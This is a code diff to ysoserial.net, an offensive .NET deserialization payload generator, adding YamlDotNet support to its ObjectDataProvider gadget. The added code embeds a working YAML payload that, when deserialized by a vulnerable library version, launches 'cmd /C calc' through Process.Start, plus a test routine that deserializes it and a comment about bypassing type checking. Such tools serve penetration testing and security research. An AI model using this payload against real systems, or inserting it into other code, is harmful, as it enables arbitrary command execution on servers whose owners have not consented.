@@ -19,7 +19,7 @@ namespace ysoserial.Generators
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer" };
+            return new List<string> { "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "YamlDotNet" };
         }
 
         public override string Name()
@@ -185,6 +185,39 @@ namespace ysoserial.Generators
                         XmlElement xmlItem = (XmlElement)xmlDoc.SelectSingleNode("root");
                         var s = new DataContractSerializer(Type.GetType(xmlItem.GetAttribute("type")));
                         var d = s.ReadObject(new XmlTextReader(new StringReader(xmlItem.InnerXml)));
+                    }
+                    catch
+                    {
+                    }
+                }
+                return payload;
+            }
+            else if (formatter.ToLower().Equals("yamldotnet"))
+                {
+                String payload = @"
+!<!System.Windows.Data.ObjectDataProvider%2c%20PresentationFramework%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=31bf3856ad364e35> {
+    MethodName: Start,
+	ObjectInstance: 
+		!<!System.Diagnostics.Process%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+			StartInfo:
+				!<!System.Diagnostics.ProcessStartInfo%2c%20System%2c%20Version=4.0.0.0%2c%20Culture=neutral%2c%20PublicKeyToken=b77a5c561934e089> {
+					FileName : cmd,
+					Arguments : '/C calc'
+
+                }
+        }
+}";
+                if (test)
+                {
+                    try
+                    {
+                        //to bypass all of the vulnerable version's type checking, we need to set up a stream
+                        using (var reader = new StreamReader(new MemoryStream(System.Text.Encoding.UTF8.GetBytes(payload))))
+                        {
+                            var deserializer = new DeserializerBuilder().Build();
+                            var result = deserializer.Deserialize(reader);
+                            Console.WriteLine("YamlDotNet string stream test complete.");
+                        }
                     }
                     catch
                     {
